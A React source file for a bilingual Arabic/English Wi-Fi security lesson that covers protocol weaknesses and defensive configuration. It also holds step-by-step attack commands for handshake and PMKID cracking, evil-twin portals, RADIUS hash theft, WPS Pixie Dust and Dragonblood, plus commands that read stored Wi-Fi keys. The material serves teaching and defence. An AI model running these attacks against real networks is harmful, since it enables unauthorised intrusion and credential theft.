"use client";
import { LessonShell, Section, Callout, Code, Analogy, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="wifi-deep">
      <L
        ar={
          <>
            <Section title="ليه الـ Wi-Fi خاص؟">
              <p>إنت في الشركة. الـ corp Wi-Fi شغّال. كل حاجة "محمية بـ password قوي".</p>
              <p>طب الـ attacker قاعد في عربية في الشارع، عنده هوائي بـ 30 دولار.</p>
              <p>هو بيشوف نفس الـ packets اللي بتشوفها. نفس الـ frames. نفس كل حاجة.</p>
              <p>الفرق الوحيد: التشفير.</p>
              <Analogy>
                الكابل النحاسي زي ماسورة بتنقل مياه — محدش يقدر يوصلها إلا لما يفتح الحيطة.
                الـ Wi-Fi زي شبورة بتطلع من الشباك — كل اللي في الشارع، في العربية، في الشقة المجاورة، بيشمها.
                التشفير مش "حماية إضافية"، هو الحاجز الوحيد بين بياناتك وأي حد ماشي بهوائي.
                لو الحاجز ضعيف، يعني مفيش حاجز.

                - بس إحنا حاطين password قوي يا حضرتك؟؟

                ها ها ها يا مستجد. الـ password القوي بيتكسر offline على RTX 4090 في يوم. اللي بيفرّق مش "قوته" بمقاييس IT، اللي بيفرّق هو طوله العشوائي وWPA3. اوعى تخلط.
              </Analogy>
              <Callout kind="info" title="حكاية: Evil Twin في مطار شيكاغو">
                في 2019، fed analysts من جهة كبيرة كانوا في travel. واحد فيهم اتصل بـ "OHARE-FREE-WIFI" — اللي مكنش الشبكة الرسمية للمطار.
                Rogue AP بـ captive portal.
                المهاجم خد credentials لـ corporate VPN.
                ومن هناك، اخترق internal network في 4 ساعات.
                الـ attacker كان قاعد في كافيه قدام gate. هوائي + Raspberry Pi.
                التكلفة: 200 دولار. الضرر: ملايين.
              </Callout>
              <Callout kind="danger" title="قانوني — استخدام مصرّح بيه بس">
                كل تكنيك تحت ده شرعي في الـ lab بتاعك أو جوه نطاق pentest موقّع.
                تهاجم شبكة الجار أو الكافيه أو شركة من غير ورق = جريمة تحت قوانين الجرائم المعلوماتية، حتى لو ما سرقتش حاجة.
                نقطة على السطر.
              </Callout>
            </Section>

            <Section title="أنواع شبكات Wi-Fi و حالة كل واحدة في 2026">
              <div className="space-y-3">
                <Card title="WEP (1999)" color="red">
                  <p>RC4 + IV قصيرة (24-bit). <b>مكسور بالكامل</b> — بيتكسر في أقل من 5 دقايق بأي كرت monitor mode.</p>
                  <p className="opacity-80 text-sm">دلوقتي بيظهر بس في طابعات قديمة، أجهزة ICS، أو أجهزة محدش حدّثها. وجوده لوحده مؤشر إن الصيانة عك.</p>
                </Card>
                <Card title="WPA / TKIP (2003)" color="red">
                  <p>ترقيع لـ WEP. <b>مكسور</b> عن طريق Beck-Tews / chopchop. ما حدش بيستخدمه دلوقتي إلا بالغلط.</p>
                </Card>
                <Card title="WPA2-PSK / AES-CCMP (2004)" color="amber">
                  <p>القياس العام لعقدين. آمن من ناحية الخوارزمية، <b>هش من ناحية الباسورد</b>. كل الهجمات الحقيقية = كسر offline لـ handshake.</p>
                  <p className="opacity-80 text-sm">معرّض لـ KRACK (2017) — اتعالج بترقيعات client. هجوم PMKID (2018) — مش محتاج client أصلاً.</p>
                </Card>
                <Card title="WPA2-Enterprise (EAP)" color="amber">
                  <p>RADIUS + شهادة. أقوى بس <b>الإعداد الغلط بيقتله</b>: عميل ما بيفحصش شهادة الـ server → Evil Twin بياخد NetNTLM/MSCHAPv2 hashes.</p>
                </Card>
                <Card title="WPA3-Personal / SAE (2018)" color="green">
                  <p>Dragonfly handshake — <b>بيمنع الكسر offline</b> نظرياً. كل محاولة محتاجة تفاعل مع AP حقيقي → forward secrecy.</p>
                  <p className="opacity-80 text-sm">ضربته ثغرات Dragonblood (CVE-2019-9494/9496) في الـ side-channel والـ downgrade. الترقيعات الحديثة قفلت معظمها.</p>
                </Card>
                <Card title="WPA3-Enterprise + 192-bit suite" color="green">
                  <p>للقطاعات الحكومية/المالية. Suite-B + ECDH P-384 + AES-GCMP-256. <b>مفيش هجمات عملية معروفة</b> على الخوارزمية نفسها — بس على الإعداد والبشر.</p>
                </Card>
                <Card title="OWE (Opportunistic Wireless Encryption)" color="amber">
                  <p>بديل آمن للـ Open networks في الكافيهات. تشفير من غير باسورد عن طريق Diffie-Hellman. <b>مش بيحمي من Evil Twin</b> لأن مفيش مصادقة للـ AP.</p>
                </Card>
                <Card title="WPS (PIN)" color="red">
                  <p>زرار أو PIN من 8 أرقام للاتصال السريع. بيتكسر في ساعات عن طريق <b>Pixie Dust</b> أو brute-force على الـ PIN. <b>قفله دايماً، من غير تفكير</b>.</p>
                </Card>
              </div>
            </Section>

            <Section title="عتاد المهاجم — ما تحتاجه فعلاً">
              <ul className="list-disc pe-6 space-y-2 opacity-90">
                <li><b>كرت يدعم monitor mode + packet injection</b>: Alfa AWUS036ACM (chipset MT7612U)، AWUS036ACH (RTL8812AU)، Panda PAU09.</li>
                <li><b>هوائي اتجاهي</b> (Yagi 16dBi) للمسافات البعيدة، أو omni للمسح المتعدد.</li>
                <li><b>SDR</b> اختياري (HackRF, BladeRF) للتحليل الأعمق والهجمات المخصصة.</li>
                <li><b>GPU للـ cracking</b>: hashcat على RTX 4090 بيكسر ~3M H/s لـ WPA2. الفرق بين فجر وأسبوع.</li>
                <li><b>Pwnagotchi / WiFi Pineapple</b> لجمع handshakes وإدارة AP خبيث.</li>
              </ul>
              <Code lang="bash">{`# تأكد البطاقة تدعم monitor + injection
iw list | grep -A 8 "Supported interface modes"
aireplay-ng --test wlan0mon`}</Code>
            </Section>

            <Section title="هجمات قابلة للتنفيذ اليوم — الخطوات">
              <TwoCol>
                <Card title="1) WPA2-PSK — handshake offline" color="red">
                  <Code lang="bash">{`airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
# في terminal آخر — إجبار client على إعادة الاتصال
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# تحويل و كسر
hcxpcapngtool -o cap.hc22000 cap-01.cap
hashcat -m 22000 cap.hc22000 rockyou.txt -r best64.rule`}</Code>
                </Card>
                <Card title="2) PMKID — بدون client" color="red">
                  <Code lang="bash">{`hcxdumptool -i wlan0mon -o pmkid.pcapng \\
  --enable_status=1
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
hashcat -m 22000 pmkid.hc22000 wordlist.txt`}</Code>
                  <p className="text-sm opacity-80 mt-2">يستهدف routers تنشر PMKID في أول EAPOL-frame. كثير منها معطّل اليوم لكن لا يزال يعمل ضد عتاد قديم.</p>
                </Card>
                <Card title="3) Evil Twin + Captive Portal" color="red">
                  <Code lang="bash">{`# AP مزيف بنفس SSID + إشارة أقوى + de-auth للـ AP الأصلي
airgeddon   # tui يقود السيناريو كاملاً
# أو يدوياً:
hostapd-mana hostapd.conf
dnsmasq -C dnsmasq.conf
# صفحة تطلب "إعادة إدخال كلمة سر Wi-Fi" — ضحايا غير تقنيين`}</Code>
                </Card>
                <Card title="4) WPA2-Enterprise — سرقة hashes" color="red">
                  <Code lang="bash">{`# eaphammer ينشئ RADIUS مزيف
./eaphammer -i wlan0 --essid CORP-WIFI --bssid AA:BB:CC:DD:EE:FF \\
  --auth wpa-eap --creds
# يلتقط MSCHAPv2 challenge/response
# ثم asleap أو hashcat -m 5500
hashcat -m 5500 ntlm.hash rockyou.txt`}</Code>
                  <p className="text-sm opacity-80 mt-2">يعمل فقط لو client لا يفحص شهادة الـ RADIUS — وهي التهيئة الافتراضية في معظم الشبكات.</p>
                </Card>
                <Card title="5) WPS — Pixie Dust" color="red">
                  <Code lang="bash">{`reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vvv
# أو
bully -b AA:BB:CC:DD:EE:FF -d wlan0mon`}</Code>
                </Card>
                <Card title="6) WPA3 — downgrade & Dragonblood" color="amber">
                  <Code lang="bash">{`# لو الشبكة "transition mode" (WPA2/WPA3 معاً)
# أنشئ AP مزيف يدعم WPA2 فقط بنفس SSID → client يقع
# Dragonblood side-channel:
git clone https://github.com/vanhoefm/dragonblood
python dragondrain.py wlan0mon AA:BB:CC:DD:EE:FF`}</Code>
                  <p className="text-sm opacity-80 mt-2">معظم الـ APs الحديثة رقّعت Dragonblood، لكن transition mode يبقى نقطة ضعف تصميمية.</p>
                </Card>
              </TwoCol>
            </Section>

            <Section title="ما لا يُكسر اليوم — حدود الواقع">
              <Callout kind="warn" title="لا يوجد طريق سحري">
                <ul className="list-disc pe-6 space-y-2">
                  <li><b>WPA3-SAE بكلمة سر طويلة (≥20 رمز عشوائي)</b> — لا يمكن كسرها offline أصلاً (التصميم يمنع ذلك). الهجوم online ضد AP محدود السرعة → غير عملي.</li>
                  <li><b>WPA3-Enterprise 192-bit + شهادات client صحيحة (EAP-TLS)</b> — لا توجد هجمات عملية معروفة. السرقة تكون من الـ endpoint لا من الراديو.</li>
                  <li><b>Wi-Fi 7 / 802.11be Protected Management Frames إجباري</b> — يمنع de-auth الكلاسيكي → هجمات الـ handshake forced re-association لا تعمل.</li>
                  <li><b>RADIUS مع validated server certificate + identity hiding</b> — Evil Twin يفشل لأن client يرفض الـ cert.</li>
                  <li><b>AES-GCMP-256</b> — لا يوجد كسر cryptographic معروف. كل الهجمات على الـ ecosystem المحيط.</li>
                </ul>
              </Callout>
            </Section>

            <Section title="طرق خفية / غير مباشرة (Workarounds)">
              <Callout kind="warn" title="عندما لا يمكن كسر الـ Wi-Fi مباشرة">
                المهاجم المحترف لا يضرب الجدار — يلفّ حوله. هذه الطرق التي تستخدمها مجموعات APT عندما يفشل الكسر المباشر:
              </Callout>
              <ol className="list-decimal pe-6 space-y-3 mt-3 opacity-90">
                <li>
                  <b>هجوم BSSID Spoofing على الـ Probe Requests</b>: الجهاز يبثّ باستمرار أسماء الشبكات التي يحفظها (PNL).
                  استخدم <code>Karma/MANA</code> للرد بـ "نعم أنا تلك الشبكة" → يتصل تلقائياً.
                </li>
                <li>
                  <b>سرقة الـ Pre-Shared Key من نقطة النهاية</b>: على Windows في
                  <code> netsh wlan show profile name=&quot;X&quot; key=clear</code>؛ على Android من ملف
                  <code> /data/misc/wifi/WifiConfigStore.xml</code> بصلاحية root.
                </li>
                <li>
                  <b>هجوم سلسلة التوريد على الـ Router</b>: استغلال CVE في firmware (Asus, TP-Link, Netgear) للوصول لـ admin
                  ثم استخراج PSK من <code>/etc/config/wireless</code>.
                </li>
                <li>
                  <b>Side-channel عبر الجدار</b>: تحليل قوة الإشارة و توقيت الحزم يكشف نشاط بشري داخل المبنى — مفيد للـ
                  reconnaissance قبل الاقتحام الفعلي.
                </li>
                <li>
                  <b>RogueAP بمسمى GuestWiFi/Free-WiFi</b> قرب الهدف: لا يحتاج اختراق شبكتهم — يكفي أن موظفاً واحداً يتصل
                  بهاتفه و تخترق ذلك الهاتف، ثم تنتقل عبر VPN الشركة.
                </li>
                <li>
                  <b>Bluetooth/UWB كقناة جانبية</b>: نفس الجهاز يبثّ Bluetooth أيضاً. ثغرات BlueBorne / KNOB تعطي pivot دون
                  لمس Wi-Fi.
                </li>
                <li>
                  <b>هجمات Layer-2 بعد الانضمام كضيف</b>: شبكات Wi-Fi كثيرة تفصل Guest/Corp بـ VLAN ضعيفة.
                  <code> yersinia</code> + VLAN hopping + ARP spoofing داخل Guest قد تصل للـ Corp.
                </li>
                <li>
                  <b>سرقة EAP credentials عبر phishing بريد قبل الوصول للموقع</b>: سرقة username/password ثم الاتصال بـ
                  Enterprise Wi-Fi شرعياً من الموقف خارج المبنى.
                </li>
                <li>
                  <b>FragAttacks (CVE-2020-24588 و رفاقها)</b>: عيوب تصميم في 802.11 تسمح بحقن plaintext frames في شبكات
                  مشفّرة. ترقّع تدريجياً لكن لا تزال تعمل ضد عتاد قديم.
                </li>
                <li>
                  <b>هجوم الـ "Captive Portal Cookie"</b>: شبكات الفنادق و المطارات تعتمد cookie للسماح بالخروج. سرقتها من
                  ضحية متصلة → دخول مباشر دون كلمة سر.
                </li>
              </ol>
            </Section>

            <Section title="الحماية — كيف تجعل شبكتك ضمن «ما لا يُكسر»">
              <Callout kind="good" title="تهيئة دفاعية مرجعية">
                <ol className="list-decimal pe-6 space-y-2">
                  <li><b>WPA3-only</b> (لا transition mode) أو WPA3-Enterprise + EAP-TLS لشبكات الموظفين.</li>
                  <li><b>Protected Management Frames إجباري</b> (PMF required) — يقتل de-auth و disassoc spoofing.</li>
                  <li><b>كلمات سر ≥20 حرف عشوائي</b> أو passphrase من ≥6 كلمات. لا تعتمد على complexity vs length.</li>
                  <li><b>عطّل WPS كلياً</b>. لا استثناءات.</li>
                  <li><b>عطّل PMKID broadcast</b> على الـ APs التي تدعم تعطيله.</li>
                  <li><b>RADIUS مع شهادة internal CA</b> + <i>إجبار client على فحص الشهادة</i> (Group Policy على Windows، Profile على iOS/Android، NetworkManager على Linux).</li>
                  <li><b>اعزل Guest Wi-Fi</b> في VLAN منفصل بـ ACL صريح يمنع كل الـ corp ranges.</li>
                  <li><b>WIDS/WIPS</b> (Aruba, Cisco, Mist) لرصد APs مزيفة و de-auth floods.</li>
                  <li><b>تخفيض إشارة قصداً</b> عند حدود المبنى — اضبط TX power بحيث لا تخرج للشارع.</li>
                  <li><b>MFA على كل خدمة داخلية</b> — حتى لو كُسر الـ Wi-Fi لا يكفي للوصول للموارد.</li>
                </ol>
              </Callout>
              <Callout kind="warn" title="مؤشرات Wi-Fi WIDS العملية">
                <ul className="list-disc pe-6 space-y-1">
                  <li>BSSID جديد ينشر نفس SSID — Evil Twin محتمل.</li>
                  <li>de-auth floods من client/AP غير مسجل.</li>
                  <li>RADIUS authentication failures من الـ same MAC بأنماط dictionary.</li>
                  <li>probe responses من APs لـ SSIDs غير معدّة في الموقع.</li>
                  <li>إشارة قوية بشكل غير معتاد من زاوية معينة من المبنى.</li>
                </ul>
              </Callout>
            </Section>

            <Section title="مصادر و قراءات">
              <ul className="list-disc pe-6 space-y-1 opacity-90">
                <li>Mathy Vanhoef — KRACK, Dragonblood, FragAttacks papers.</li>
                <li>Wi-Fi Alliance — WPA3 Specification.</li>
                <li>NIST SP 800-153 — Wireless LAN Security Guidelines.</li>
                <li>Aircrack-ng / hashcat / hcxtools docs.</li>
              </ul>
            </Section>

            <Section title="غلطات الـ junior في الـ Wi-Fi">
              <Callout kind="danger" title="اللي بيكلّفك الشبكة كلها">
                <ul>
                  <li><b>WPA2-PSK مع password "Welcome2024"</b> — handshake واحد + RTX 4090 = الـ password في 4 ساعات. والشبكة كلها بقت مفتوحة.</li>
                  <li><b>WPA2-Enterprise بدون certificate validation على الـ client</b> — Evil Twin بياخد NetNTLM hashes في 30 ثانية. اللاب التوب الـ corporate بيـ auto-connect لـ AP بنفس الاسم.</li>
                  <li><b>Guest network على نفس VLAN</b> — الـ visitor عنده access للـ printer، اللي عنده access للـ AD، اللي عنده credentials لـ DC. الـ chain كله من زائر شاي.</li>
                  <li><b>WPS مفعّل</b> — Reaver / Pixie Dust بياخدهالك في دقايق. اقفله من الـ AP، مش بس "اخفي SSID".</li>
                  <li><b>"اخفاء SSID = أمان"</b> — لأ. الـ SSID بيتنشر مع كل client بيـ probe. الـ attacker بيشوفه في 5 ثواني بـ airodump.</li>
                  <li><b>ما بيراقبش rogue APs</b> — wireless IDS مش luxury. الـ attacker بيركّب AP في meeting room، الموظفين بيتصلوا بيه، خلاص.</li>
                </ul>
              </Callout>
            </Section>

            <Section title="الخلاصة الناشفة">
              <p>الـ Wi-Fi شبورة في الشارع. أي حد عنده 30 دولار وهوائي بيقدر يسمع.</p>
              <p>الفرق بين شبكة آمنة وشبكة مكشوفة = WPA3-Enterprise + EAP-TLS + certificate pinning + wireless monitoring.</p>
              <p>الباقي إسعافات أولية.</p>
              <p>وفي البيئات الحكومية الحساسة: الـ Wi-Fi مش option من الأصل. السيرفرات والـ admin workstations على كابل، بس وخلاص.</p>
              <p>اكتبها على إيدك: لو الـ admin workstation على Wi-Fi، يبقى مفيش Wi-Fi، يبقى مفيش admin.</p>
            </Section>
          </>
        }
        en={
          <>
            <Section title="Why Wi-Fi is special">
              <Analogy>
                Copper is a pipe through a wall — only someone who breaks the wall sees the water. Wi-Fi is a fog drifting
                out the window: every neighbor, every parked car, every adjacent flat breathes it. Encryption isn't
                "extra protection"; it's the only barrier between your traffic and anyone with a $30 antenna.
              </Analogy>
              <Callout kind="danger" title="Legal — authorized use only">
                Everything below is legal in your own lab or in a signed pentest engagement. Attacking your neighbor, a
                café, or a company without written authorization is a crime under computer-misuse laws — even if you
                steal nothing.
              </Callout>
            </Section>

            <Section title="Wi-Fi types and where each one stands in 2026">
              <div className="space-y-3">
                <Card title="WEP (1999)" color="red">
                  <p>RC4 with a 24-bit IV. <b>Completely broken</b> — cracked in under 5 minutes with any monitor-mode card.</p>
                  <p className="opacity-80 text-sm">Today only seen on legacy printers, ICS gear, or unmaintained devices. Its presence alone signals neglect.</p>
                </Card>
                <Card title="WPA / TKIP (2003)" color="red">
                  <p>WEP patch. <b>Broken</b> via Beck-Tews / chopchop. Only ever seen by mistake today.</p>
                </Card>
                <Card title="WPA2-PSK / AES-CCMP (2004)" color="amber">
                  <p>The de-facto standard for two decades. Algorithm is fine; <b>passwords are the weak link</b>. Real attacks are offline cracking of captured handshakes.</p>
                  <p className="opacity-80 text-sm">KRACK (2017) — fixed via client patches. PMKID attack (2018) — works without a client.</p>
                </Card>
                <Card title="WPA2-Enterprise (EAP)" color="amber">
                  <p>RADIUS + certificate. Stronger, but <b>misconfiguration is fatal</b>: a client that doesn't validate the server cert hands NetNTLM/MSCHAPv2 hashes to an Evil Twin.</p>
                </Card>
                <Card title="WPA3-Personal / SAE (2018)" color="green">
                  <p>Dragonfly handshake. <b>Blocks offline cracking</b> by design — every guess requires a live exchange with the AP, giving forward secrecy.</p>
                  <p className="opacity-80 text-sm">Dragonblood side-channel + downgrade flaws (CVE-2019-9494/9496) hit early. Modern firmware closes most.</p>
                </Card>
                <Card title="WPA3-Enterprise + 192-bit suite" color="green">
                  <p>For government / financial use. Suite-B + ECDH P-384 + AES-GCMP-256. <b>No practical attacks on the algorithm itself</b> — only on configuration and humans.</p>
                </Card>
                <Card title="OWE (Opportunistic Wireless Encryption)" color="amber">
                  <p>Replacement for café Open networks. Diffie-Hellman without a password. <b>Doesn't stop Evil Twin</b> — there's no AP authentication.</p>
                </Card>
                <Card title="WPS (PIN)" color="red">
                  <p>Push-button or 8-digit PIN for fast pairing. Cracked in hours via <b>Pixie Dust</b> or PIN brute-force. <b>Always disable.</b></p>
                </Card>
              </div>
            </Section>

            <Section title="Attacker hardware — what you actually need">
              <ul className="list-disc ps-6 space-y-2 opacity-90">
                <li><b>Card with monitor mode + packet injection</b>: Alfa AWUS036ACM (MT7612U), AWUS036ACH (RTL8812AU), Panda PAU09.</li>
                <li><b>Directional antenna</b> (Yagi 16dBi) for distance, or omni for area scans.</li>
                <li><b>SDR</b> optional (HackRF, BladeRF) for deeper analysis or custom attacks.</li>
                <li><b>GPU for cracking</b>: hashcat on an RTX 4090 hits ~3M H/s for WPA2.</li>
                <li><b>Pwnagotchi / Wi-Fi Pineapple</b> for handshake collection and rogue-AP management.</li>
              </ul>
              <Code lang="bash">{`# Verify the card supports monitor + injection
iw list | grep -A 8 "Supported interface modes"
aireplay-ng --test wlan0mon`}</Code>
            </Section>

            <Section title="Practical attacks you can run today">
              <TwoCol>
                <Card title="1) WPA2-PSK — offline handshake" color="red">
                  <Code lang="bash">{`airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
# Other terminal — force a client to reconnect
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# Convert & crack
hcxpcapngtool -o cap.hc22000 cap-01.cap
hashcat -m 22000 cap.hc22000 rockyou.txt -r best64.rule`}</Code>
                </Card>
                <Card title="2) PMKID — no client needed" color="red">
                  <Code lang="bash">{`hcxdumptool -i wlan0mon -o pmkid.pcapng \\
  --enable_status=1
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
hashcat -m 22000 pmkid.hc22000 wordlist.txt`}</Code>
                  <p className="text-sm opacity-80 mt-2">Targets routers that emit PMKID in the first EAPOL frame. Many modern APs disable this, but legacy gear still bites.</p>
                </Card>
                <Card title="3) Evil Twin + Captive Portal" color="red">
                  <Code lang="bash">{`# Fake AP, same SSID, stronger signal + de-auth original AP
airgeddon   # TUI walks you through the whole flow
# Or manually:
hostapd-mana hostapd.conf
dnsmasq -C dnsmasq.conf
# A page asking to "re-enter Wi-Fi password" catches non-technical victims`}</Code>
                </Card>
                <Card title="4) WPA2-Enterprise — hash theft" color="red">
                  <Code lang="bash">{`# eaphammer stands up a fake RADIUS
./eaphammer -i wlan0 --essid CORP-WIFI --bssid AA:BB:CC:DD:EE:FF \\
  --auth wpa-eap --creds
# Captures MSCHAPv2 challenge/response
# Then asleap or hashcat -m 5500
hashcat -m 5500 ntlm.hash rockyou.txt`}</Code>
                  <p className="text-sm opacity-80 mt-2">Only works when the client doesn't validate the RADIUS cert — sadly the default in most networks.</p>
                </Card>
                <Card title="5) WPS — Pixie Dust" color="red">
                  <Code lang="bash">{`reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vvv
# or
bully -b AA:BB:CC:DD:EE:FF -d wlan0mon`}</Code>
                </Card>
                <Card title="6) WPA3 — downgrade & Dragonblood" color="amber">
                  <Code lang="bash">{`# If the network is in "transition mode" (WPA2/WPA3 both)
# Stand up a fake AP supporting only WPA2 with the same SSID — clients fall back
# Dragonblood side-channel:
git clone https://github.com/vanhoefm/dragonblood
python dragondrain.py wlan0mon AA:BB:CC:DD:EE:FF`}</Code>
                  <p className="text-sm opacity-80 mt-2">Most modern APs patched Dragonblood, but transition mode remains a designed weakness.</p>
                </Card>
              </TwoCol>
            </Section>

            <Section title="What still holds — the limits of attack">
              <Callout kind="warn" title="There is no magic path">
                <ul className="list-disc ps-6 space-y-2">
                  <li><b>WPA3-SAE with a long random password (≥20 chars)</b> — cannot be cracked offline at all (the design forbids it). Online attack is rate-limited by the AP, so it's impractical.</li>
                  <li><b>WPA3-Enterprise 192-bit + valid client certs (EAP-TLS)</b> — no practical attack known. Steal from the endpoint, not from the air.</li>
                  <li><b>Wi-Fi 7 / 802.11be with PMF required</b> — kills classic de-auth, so the forced-reassociation handshake capture path doesn't work.</li>
                  <li><b>RADIUS with validated server cert + identity hiding</b> — Evil Twin fails because the client refuses the cert.</li>
                  <li><b>AES-GCMP-256</b> — no known cryptographic break. All attacks pivot to the surrounding ecosystem.</li>
                </ul>
              </Callout>
            </Section>

            <Section title="Hidden / indirect ways — workarounds">
              <Callout kind="warn" title="When you can't break the Wi-Fi directly">
                A skilled attacker doesn't punch the wall — they walk around it. These are the moves APT crews use when a
                direct crack fails:
              </Callout>
              <ol className="list-decimal ps-6 space-y-3 mt-3 opacity-90">
                <li>
                  <b>Probe-request abuse (Karma/MANA)</b>. Devices constantly broadcast their saved network list (PNL).
                  Reply "yes I'm that network" and the device auto-associates.
                </li>
                <li>
                  <b>Steal the PSK from an endpoint</b>. On Windows: <code>netsh wlan show profile name=&quot;X&quot; key=clear</code>.
                  On Android (root): <code>/data/misc/wifi/WifiConfigStore.xml</code>.
                </li>
                <li>
                  <b>Router supply-chain attack</b>. Exploit a CVE in Asus / TP-Link / Netgear firmware to reach admin,
                  then dump PSK from <code>/etc/config/wireless</code>.
                </li>
                <li>
                  <b>RF side-channel through the wall</b>. Signal-strength + packet-timing analysis reveals human activity
                  inside — useful recon before a physical or social attack.
                </li>
                <li>
                  <b>Rogue AP labelled GuestWiFi/Free-WiFi</b> near the target. You don't need to crack their network — one
                  employee connects from their phone, you compromise the phone, then ride the corporate VPN inward.
                </li>
                <li>
                  <b>Bluetooth/UWB as a side channel</b>. The same device speaks Bluetooth too. BlueBorne / KNOB-class
                  flaws give a pivot without touching Wi-Fi.
                </li>
                <li>
                  <b>Layer-2 attacks after joining as a guest</b>. Many networks split Guest/Corp with weak VLANs.
                  <code> yersinia </code>+ VLAN hopping + ARP spoofing inside Guest can reach Corp.
                </li>
                <li>
                  <b>Phish EAP credentials before going on-site</b>. Steal a username/password by email, then connect to
                  the Enterprise Wi-Fi legitimately from the parking lot.
                </li>
                <li>
                  <b>FragAttacks (CVE-2020-24588 et al.)</b>. 802.11 design flaws inject plaintext frames into encrypted
                  networks. Patched gradually — still works against legacy gear.
                </li>
                <li>
                  <b>Captive-portal cookie theft</b>. Hotel and airport networks use a cookie to allow internet access.
                  Steal one from a connected victim and you walk through without a password.
                </li>
              </ol>
            </Section>

            <Section title="Defense — make your network land in 'still holds'">
              <Callout kind="good" title="Reference defensive config">
                <ol className="list-decimal ps-6 space-y-2">
                  <li><b>WPA3-only</b> (no transition mode), or WPA3-Enterprise + EAP-TLS for staff networks.</li>
                  <li><b>Protected Management Frames required</b> (PMF required) — kills de-auth and disassoc spoofing.</li>
                  <li><b>Passwords ≥20 random chars</b> or a passphrase of ≥6 words. Don't trade complexity for length.</li>
                  <li><b>Disable WPS entirely.</b> No exceptions.</li>
                  <li><b>Disable PMKID broadcast</b> on APs that support the option.</li>
                  <li><b>RADIUS with internal-CA cert</b> + <i>force clients to validate the cert</i> (Group Policy on Windows, profile on iOS/Android, NetworkManager on Linux).</li>
                  <li><b>Isolate Guest Wi-Fi</b> in a separate VLAN with explicit ACLs blocking all corp ranges.</li>
                  <li><b>WIDS/WIPS</b> (Aruba, Cisco, Mist) for rogue APs and de-auth floods.</li>
                  <li><b>Deliberately reduce signal at the building edge</b> — tune TX power so it doesn't spill into the street.</li>
                  <li><b>MFA on every internal service</b> — even if the Wi-Fi falls, it isn't enough to reach data.</li>
                </ol>
              </Callout>
              <Callout kind="warn" title="Practical WIDS signals">
                <ul className="list-disc ps-6 space-y-1">
                  <li>A new BSSID broadcasting your SSID — likely Evil Twin.</li>
                  <li>De-auth floods from an unregistered client/AP.</li>
                  <li>RADIUS auth failures from a single MAC with dictionary patterns.</li>
                  <li>Probe responses for SSIDs not configured at the site.</li>
                  <li>Unusually strong signal coming from one corner of the perimeter.</li>
                </ul>
              </Callout>
            </Section>

            <Section title="Sources and further reading">
              <ul className="list-disc ps-6 space-y-1 opacity-90">
                <li>Mathy Vanhoef — KRACK, Dragonblood, FragAttacks papers.</li>
                <li>Wi-Fi Alliance — WPA3 Specification.</li>
                <li>NIST SP 800-153 — Wireless LAN Security Guidelines.</li>
                <li>Aircrack-ng / hashcat / hcxtools docs.</li>
              </ul>
            </Section>
          </>
        }
      />
    </LessonShell>
  );
}
